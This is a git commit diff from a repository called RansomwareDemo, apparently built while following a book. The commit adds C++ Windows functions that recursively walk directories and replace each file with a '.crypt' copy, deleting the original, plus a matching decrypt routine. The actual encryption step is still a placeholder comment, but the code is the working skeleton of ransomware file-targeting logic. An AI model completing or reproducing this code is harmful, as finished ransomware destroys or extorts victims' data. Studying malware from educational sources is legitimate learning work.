5c1914ee8251e21b0734949bf3d99985e85a280a
Soda7592 <e80704580@gmail.com>
2024-04-08 00:20:37 +0800

    De/En Crypt function p26

--- Demo.cpp
+++ Demo.cpp
@@ -14,15 +14,43 @@ DWORD ScanPath(LPTSTR);
 // STR -> String
 
 int _tmain(int argc, _TCHAR* argv[]) {
+    // DWORD attributes = GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt"));
+    EncryptFile(_T("C:\\Users\\Mata\\Desktop\\wget.txt"), NULL);
     return 0;
 }
 
-int EncryptFile(LPTSTR lpFileName, LPVOID EncKey) {
-    _tprintf(_T("encrypt"));
+BOOL EncryptFile(LPTSTR lpFileName, LPVOID EncKey) {
+    TCHAR szOutputFile[MAX_PATH]; // MAX_PATH was defined 260, (in minwindef.h)
+    size_t length_of_arg;
+    StringCchPrintf(szOutputFile, MAX_PATH - 1, _T("%s.crypt"), lpFileName);
+    StringCchLength(szOutputFile, MAX_PATH, &length_of_arg);
+    if(length_of_arg <= (MAX_PATH - 3)) {
+        _tprintf(_T("Encoding %s \n"), lpFileName);
+        // printf("%lu", GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt")));
+        if(CopyFile(lpFileName, szOutputFile, TRUE)) { // Encrypt function here
+            if(DeleteFile(lpFileName)) {
+                return TRUE;
+            }
+        }
+    }
+    return FALSE;
 }
 
-int DecryptFile(LPTSTR lpFileName, LPVOID DecKey) {
-    _tprintf(_T("decrypt"));
+BOOL DecryptFile(LPTSTR lpFileName, LPVOID DecKey) {
+    TCHAR szOutputFile[MAX_PATH]; // MAX_PATH was defined 260, (in minwindef.h)
+    size_t length_of_arg;
+    StringCchCopy(szOutputFile, MAX_PATH, lpFileName);
+    TCHAR *ptr = _tcsrchr(szOutputFile, '.');
+    if(ptr && !_tcsicmp(ptr, _T(".crypt"))) {
+        *ptr = '\0';
+        _tprintf(_T("Decoding %s\n"), szOutputFile);
+    }
+    if(CopyFile(lpFileName, szOutputFile, TRUE)) { // Encrypt function here
+        if(DeleteFile(lpFileName)) {
+            return TRUE;
+        }
+    }
+    return FALSE;
 }
 
 DWORD ScanPath(LPTSTR lpPath) {
@@ -46,7 +74,17 @@ DWORD ScanPath(LPTSTR lpPath) {
             return 0;
         }
         do {
-            _tprintf(_T("%s\n"), ffd.cFileName);
+            // _tprintf(_T("%s\n"), ffd.cFileName);
+            // Usage of _tcscmp function is the same as strcmp but it is used to compare TCHAR.
+            if(!_tcscmp(ffd.cFileName, _T(".")) || !_tcscmp(ffd.cFileName, _T(".."))) {
+                continue;
+            }
+            TCHAR szFullPath[MAX_PATH];
+            StringCchPrintf(szFullPath, MAX_PATH - 1, _T("%s\\%s"), lpPath, ffd.cFileName);
+            StringCchLength(szFullPath, MAX_PATH, &length_of_arg);
+            if(length_of_arg <= MAX_PATH-3) {
+                dwCount += ScanPath(szFullPath);
+            }
 
         }while(FindNextFile(hFind, &ffd) != 0);
         
@@ -54,7 +92,7 @@ DWORD ScanPath(LPTSTR lpPath) {
         FindClose(hFind);
     }
     else {
-        // Add encryption/decryption functions here;
+        // Add encryption/decryption functions here.
         _tprintf(_T("%s\n"), lpPath);
         dwCount++;
     }
--- README.md
+++ README.md
@@ -1,2 +1,4 @@
 # RansomwareDemo
 A ransomware from book : https://www.drmaster.com.tw/bookinfo.asp?BookID=MP21719
+add strsafe.h to mingw/include
+strsafe.h url : https://raw.githubusercontent.com/nuigroup/ccv-multicam/master/branches/test/videoInput_GUID/videoInputSrcAndDemos/libs/DShow/Include/strsafe.h
